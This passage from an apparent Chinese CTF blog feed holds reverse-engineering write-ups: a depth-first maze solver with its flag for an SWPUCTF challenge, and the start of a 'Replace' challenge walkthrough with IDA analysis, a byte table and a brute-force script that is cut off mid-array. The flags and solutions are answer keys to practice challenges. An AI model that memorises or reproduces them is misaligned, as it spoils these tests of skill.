punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>usedmap <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>maze<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>maze<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment"># 生成与迷宫相同规格的全0列表，用来记录已经走过的位置  </span>  sti <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 初始位置的横坐标  </span>stj <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 初始位置的纵坐标  </span>edi <span class="token operator">=</span> <span class="token number">24</span>  <span class="token comment"># 终点位置的横坐标  </span>edj <span class="token operator">=</span> <span class="token number">23</span>  <span class="token comment"># 终点位置的纵坐标  </span>flag <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">def</span> <span class="token function">dfs</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 走迷宫  </span>    <span class="token keyword">global</span> flag      <span class="token keyword">if</span> x <span class="token operator">==</span> edi <span class="token keyword">and</span> y <span class="token operator">==</span> edj<span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>          <span class="token keyword">return</span>      <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可以往下走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'s'</span>  <span class="token comment"># 向下走，记录路径  </span>        dfs<span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span>  <span class="token comment"># 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 遇到死胡同，回退到标记的地方  </span>    <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可以往上走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'w'</span>  <span class="token comment"># 向上走，记录路径  </span>        dfs<span class="token punctuation">(</span>x <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> y<span class="token punctuation">)</span>  <span class="token comment"># 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 遇到死胡同，回退到标记的地方  </span>    <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可以往右走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'d'</span>  <span class="token comment"># 向右走，记录路径  </span>        dfs<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 遇到死胡同，回退到标记的地方  </span>    <span class="token keyword">if</span> maze<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">and</span> usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>  <span class="token comment"># 可以往左走  </span>        usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 将现在所处的点标记，因为不能再走，否则会兜圈子  </span>        flag <span class="token operator">+=</span> <span class="token string">'a'</span>  <span class="token comment"># 向左走，记录路径  </span>        dfs<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 从下一个位置开始走  </span>        flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>          usedmap<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 遇到死胡同，回退到标记的地方  </span>    dfs<span class="token punctuation">(</span>sti<span class="token punctuation">,</span> stj<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><blockquote><p>NSSCTF{69193150b15c87d39252d974bc323217}</p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/SWPUCTF-%E8%80%81%E9%BC%A0%E8%B5%B0%E8%BF%B7%E5%AE%AB5.png" alt="SWPUCTF-老鼠走迷宫5.png"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【攻防世界】Replace</title>
      <link href="/posts/d92765d4.html"/>
      <url>/posts/d92765d4.html</url>
      
        <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p><mark>对于 flag 字符串中的字符 ASCii 码进行取余数处理的加密，采用正向暴力破解更快</mark><br><em>因为 flag 中的字符一定是可打印字符， ASCii 码范围从 32 ~ 126，直接遍历一个一个尝试，直到符合条件即可</em></p></li><li><p><strong>暴力破解不是万能的，因为有的加密方法，通过密文推出的明文可能由很多个都符合条件</strong>，视具体情况判断，<mark>当找到一个字符后一定要加上 break 退出循环</mark></p></li><li><p><mark>IDA中，在字符串的最后，用“0”表示结束</mark></p></li></ul><hr><p><a href="https://adworld.xctf.org.cn/challenges/details?hash=aa677771-ac2e-4562-b0a6-72ed6cd04603_2&task_category_id=4">【攻防世界】Replace</a></p><hr><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>先进行常规 upx 脱壳</p><p>IDA 打开，进入主函数</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Replace1.png" alt="攻防世界-Replace1.png"></p><p>输入 Buffer，且 Buffer 的长度需满足 <code>(strlen(Buffer) - 35) \&lt;= 2</code>。当 <code>sub_401090(Buffer, v3)</code> 返回 1 时，破解成功</p><p>查看 <code>sub_401090(Buffer, v3)</code> ，发现输入 Buffer 的长度必须为 35；且处理后的 35个字符，每一个都必须符合 <code>byte_4021A0\[16 \* v6 + v7\] != ((v11 + v12) ^ 0x19)</code> 的条件</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Replace2.png" alt="攻防世界-Replace2.png"></p><p>由于 <code>byte_402150[]</code> 和 <code>byte_402151[]</code> 的值在处理过程中未发生修改，且值已经给出，故可以从这里入手</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Replace3.png" alt="攻防世界-Replace3.png"></p><p><code>byte_402150[]</code> 的内容：”2a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6”<br><code>byte_402151[]</code> 的内容：”a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6”</p><p>同理得出 <code>byte_4021A0[]</code> 的内容：<br><strong>在 IDA View-A 中，全选数组的位置，右键 “Convert” –&gt; “Convert to C&#x2F;C++ array” 可快速获取数组数据，并将其转化为对应的语言</strong></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Replace4.png" alt="攻防世界-Replace4.png"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">byte_4021A0<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0xF2</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span><span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0xA2</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span><span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0xF7</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0xD6</span><span class="token punctuation">,</span> <span class="token number">0xB3</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span><span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0xA3</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span><span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span><span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span><span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span><span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span><span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>v4 为计数器，共有35轮循环，分别处理 Buffer 的35个字符，v5 用来表示 Buffer 每一位字符</p><p>先根据 <code>byte_402150[]</code> 和 <code>byte_402151[]</code> 的值在过程中未发生修改，得到每一轮 v8、v10 的值，进而得到 v9、v11、v12 的值和 <code>((v11 + v12) ^ 0x19)</code> 的值</p><p>由于 v5 的值与 <code>byte_4021A0[]</code> 的下标有关，找出 <code>byte_4021A0[]</code> 中与 <code>((v11 + v12) ^ 0x19)</code> 的值相等的元素，根据其下标即可知道 v6、v7 的值</p><p>但是根据下标反推出的 v6、v7 的值并不唯一，而且 v6、v7 对 v5 进行了求余操作，想利用 v6、v7 反向暴力破解求出 v5 很难</p><p>所以这里通过正向暴力破解：<br>由于 flag 中的字符一定是可打印字符， ASCii 码范围从 32 ~ 126，直接遍历一个一个尝试<br>直到找到 v5 处理后得到符合条件的 v6、v7 使得 <code>byte_4021A0[16 * v6 + v7] == ((v11 + v12) ^ 0x19)</code> 即可，这个 v5 就是原本加密前的 Buffer 中的字符，将符合条件的 v5 全部输出</p><hr><h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h1><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> byte_4021A0<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0xF2</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span>            <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token 